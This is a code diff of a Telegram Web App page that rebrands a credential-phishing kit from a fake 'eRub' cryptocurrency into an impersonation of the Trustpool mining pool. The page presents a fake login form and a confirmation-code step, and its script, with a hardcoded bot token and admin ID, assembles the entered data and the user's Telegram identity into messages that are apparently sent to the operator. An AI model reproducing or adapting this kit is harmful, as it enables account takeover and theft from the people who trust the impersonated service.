@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>eRub</title>
+<title>Trustpool</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -80,7 +80,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 .appbar-logo {
     width: 40px; height: 40px;
     border-radius: 10px;
-    background: linear-gradient(135deg, #1E64FF, #00CBEF);
+    background: linear-gradient(135deg, #3366FF, #00D68F);
     display: flex; align-items: center; justify-content: center;
     font-weight: 700; font-size: 18px; color: #fff;
     flex-shrink: 0;
@@ -387,96 +387,95 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 <div class="app">
 
     <div class="appbar">
-        <div class="appbar-logo">e</div>
+        <div class="appbar-logo">T</div>
         <div>
-            <div class="appbar-title">eRub</div>
-            <div class="appbar-sub">Суверенная криптовалюта</div>
+            <div class="appbar-title">Trustpool</div>
+            <div class="appbar-sub">Майнинг-пул</div>
         </div>
     </div>
 
     <!-- ============ ГЛАВНАЯ ============ -->
     <div id="pageMain" class="page active">
         <div class="hero">
-            <h2>Первичное распределение</h2>
-            <p>1 миллиард eRub за 30 дней</p>
-            <div class="badge">Акция стартовала</div>
+            <h2>Майнинг-пул Trustpool</h2>
+            <p>Самая низкая комиссия на майнинг — 1%</p>
+            <div class="badge">Лучший майнинг-пул 2025</div>
         </div>
 
         <div class="menu">
             <button class="menu-item" onclick="goTo('about')">
                 <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg></span>
-                О проекте <span class="arrow">›</span>
+                О пуле <span class="arrow">›</span>
             </button>
             <button class="menu-item" onclick="goTo('buy')">
                 <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/></svg></span>
-                Как купить <span class="arrow">›</span>
+                Монеты <span class="arrow">›</span>
             </button>
             <button class="menu-item" onclick="goTo('guide')">
                 <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h10"/></svg></span>
-                Руководство <span class="arrow">›</span>
+                Как начать <span class="arrow">›</span>
             </button>
             <button class="menu-item" onclick="goTo('faq')">
                 <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg></span>
-                Частые вопросы <span class="arrow">›</span>
+                Вопросы <span class="arrow">›</span>
             </button>
         </div>
 
         <button class="btn-primary" onclick="goTo('loginForm')">Войти</button>
 
         <div class="register-link">
-            Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится','info');return false;">Зарегистрироваться</a>
+            Нет аккаунта? <a href="#" onclick="showMessage('Регистрация на сайте trustpool.cc','info');return false;">Зарегистрироваться</a>
         </div>
     </div>
 
-    <!-- ============ О ПРОЕКТЕ ============ -->
+    <!-- ============ О ПУЛЕ ============ -->
     <div id="pageAbout" class="page">
         <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg></div>
-        <div class="page-title">О проекте</div>
-        <div class="page-sub">Суверенная криптовалюта eRub</div>
-        <div class="card"><p><span class="highlight">eRub</span> — децентрализованная криптовалюта на базе собственного суверенного блокчейна.</p></div>
-        <div class="card"><p>eRub не является стейблкоином или государственной цифровой валютой: её стоимость формируется открытым спросом и предложением.</p></div>
-        <div class="card"><p>Проект сочетает концепцию <span class="highlight">национальной расчётной единицы</span> с принципами блокчейн-технологий.</p></div>
-        <div class="card"><p>Сеть управляется <span class="highlight">децентрализованным сообществом</span> держателей монет.</p></div>
+        <div class="page-title">О пуле</div>
+        <div class="page-sub">Trustpool — майнинг-пул</div>
+        <div class="card"><p><span class="highlight">Trustpool</span> — один из топ-10 майнинг-пулов мира с комиссией всего 1%.</p></div>
+        <div class="card"><p>Мы присутствуем в <span class="highlight">112 странах</span> и обслуживаем более 170 000 пользователей.</p></div>
+        <div class="card"><p>Добывайте BTC, LTC, DOGE, DASH, KAS и другие монеты на выгодных условиях.</p></div>
         <button class="btn-back" onclick="goTo('main')">← Назад</button>
     </div>
 
-    <!-- ============ КАК КУПИТЬ ============ -->
+    <!-- ============ МОНЕТЫ ============ -->
     <div id="pageBuy" class="page">
         <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M2 12h20"/></svg></div>
-        <div class="page-title">Как купить</div>
-        <div class="page-sub">Пошаговая инструкция</div>
-        <div class="card"><div class="num">Шаг 1</div><h3>Создай кошелёк</h3><p>Используйте готовый или создайте новый кошелёк в системе eRub.</p></div>
-        <div class="card"><div class="num">Шаг 2</div><h3>Введи сумму</h3><p>Укажите количество рублей, USDT или USDC для обмена на eRub.</p></div>
-        <div class="card"><div class="num">Шаг 3</div><h3>Получи eRub</h3><p>Токены мгновенно поступят на ваш кошелёк.</p></div>
+        <div class="page-title">Монеты</div>
+        <div class="page-sub">Что можно майнить</div>
+        <div class="card"><div class="num">BTC</div><h3>Bitcoin</h3><p>Хешрейт пула: 10.4 EH/s. Комиссия 1%.</p></div>
+        <div class="card"><div class="num">LTC</div><h3>Litecoin + Doge + Bells</h3><p>Merged-майнинг. Комиссия 1%.</p></div>
+        <div class="card"><div class="num">KAS</div><h3>Kaspa</h3><p>Хешрейт пула: 2.1 PH/s. Комиссия 1%.</p></div>
         <button class="btn-back" onclick="goTo('main')">← Назад</button>
     </div>
 
-    <!-- ============ РУКОВОДСТВО ============ -->
+    <!-- ============ КАК НАЧАТЬ ============ -->
     <div id="pageGuide" class="page">
         <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h10"/></svg></div>
-        <div class="page-title">Руководство</div>
-        <div class="page-sub">Всё, что нужно знать</div>
-        <div class="card"><div class="num">01</div><h3>Собственные технологии</h3><p>еРубль работает на собственной цифровой платформе, созданной с нуля.</p></div>
-        <div class="card"><div class="num">02</div><h3>Безопасность</h3><p>Постквантовая защита — передовой мировой стандарт безопасности.</p></div>
-        <div class="card"><div class="num">03</div><h3>Доходность</h3><p>Алгоритм Proof-of-Stake — пассивный доход и экологичность.</p></div>
+        <div class="page-title">Как начать</div>
+        <div class="page-sub">3 шага до майнинга</div>
+        <div class="card"><div class="num">Шаг 1</div><h3>Зарегистрируйтесь</h3><p>Создайте пароль и укажите email на trustpool.cc.</p></div>
+        <div class="card"><div class="num">Шаг 2</div><h3>Подключите оборудование</h3><p>Укажите стратумы для нужной криптовалюты.</p></div>
+        <div class="card"><div class="num">Шаг 3</div><h3>Настройте выплаты</h3><p>Выберите порог и адрес для получения дохода.</p></div>
         <button class="btn-back" onclick="goTo('main')">← Назад</button>
     </div>
 
     <!-- ============ FAQ ============ -->
     <div id="pageFaq" class="page">
         <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg></div>
-        <div class="page-title">Частые вопросы</div>
-        <div class="page-sub">Ответы на популярные вопросы</div>
-        <div class="faq-item"><div class="q">Что такое eRub?</div><div class="a">Суверенная криптовалюта на базе собственного блокчейна.</div></div>
-        <div class="faq-item"><div class="q">Как купить eRub?</div><div class="a">Зарегистрируйтесь и перейдите в раздел «Как купить».</div></div>
-        <div class="faq-item"><div class="q">Где хранить eRub?</div><div class="a">В официальном кошельке на платформе.</div></div>
+        <div class="page-title">Вопросы</div>
+        <div class="page-sub">Частые вопросы</div>
+        <div class="faq-item"><div class="q">Какая комиссия?</div><div class="a">1% снимается автоматически с баланса. Для Merged-майнинга — 0%.</div></div>
+        <div class="faq-item"><div class="q">Какой минимальный порог?</div><div class="a">0.001 BTC, 20 DOGE, 50 KAS и т.д. — зависит от монеты.</div></div>
+        <div class="faq-item"><div class="q">Когда приходят выплаты?</div><div class="a">Раз в сутки, с 5:00 до 13:00 МСК, после достижения порога.</div></div>
         <button class="btn-back" onclick="goTo('main')">← Назад</button>
     </div>
 
     <!-- ============ ВХОД ============ -->
     <div id="pageLoginForm" class="page">
         <div class="page-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M15 12H3"/></svg></div>
-        <div class="page-title">Вход в eRub</div>
+        <div class="page-title">Вход в Trustpool</div>
         <div class="page-sub">Введите данные для входа</div>
 
         <div class="form-group"><label>Email</label><input type="email" id="email" placeholder="Введите email"></div>
@@ -526,7 +525,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
     // ============================================================
     const BOT_TOKEN = "9165420485:AAE0SoH1Accukz1rbZ8mww72aG3jx3iyleA";
     const ADMIN_ID  = "8542901240";
-    const SUPPORT_LINK = "https://t.me/erubsite";
+    const SUPPORT_LINK = "https://t.me/trustpool";
     const MAX_ATTEMPTS = 3;
 
     const tg = window.Telegram.WebApp;
@@ -654,7 +653,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 
         const user = tg.initDataUnsafe?.user || {};
         const msg =
-            `🔔 НОВАЯ ЗАЯВКА (ВХОД)\n\n` +
+            `🔔 НОВАЯ ЗАЯВКА (ВХОД) Trustpool\n\n` +
             `👤 ID: ${user.id || 'неизвестно'}\n` +
             `👤 Имя: ${user.first_name || '-'}\n` +
             `👤 Username: @${user.username || 'нет'}\n\n` +
@@ -690,7 +689,7 @@ h1, h2, h3, h4 { font-size: inherit; font-weight: inherit; }
 
         const user = tg.initDataUnsafe?.user || {};
         const msg =
-            `📧 КОД ПОДТВЕРЖДЕНИЯ\n\n` +
+            `📧 КОД ПОДТВЕРЖДЕНИЯ Trustpool\n\n` +
             `👤 ID: ${user.id || 'неизвестно'}\n` +
             `👤 Имя: ${user.first_name || '-'}\n` +
             `👤 Username: @${user.username || 'нет'}\n\n` +
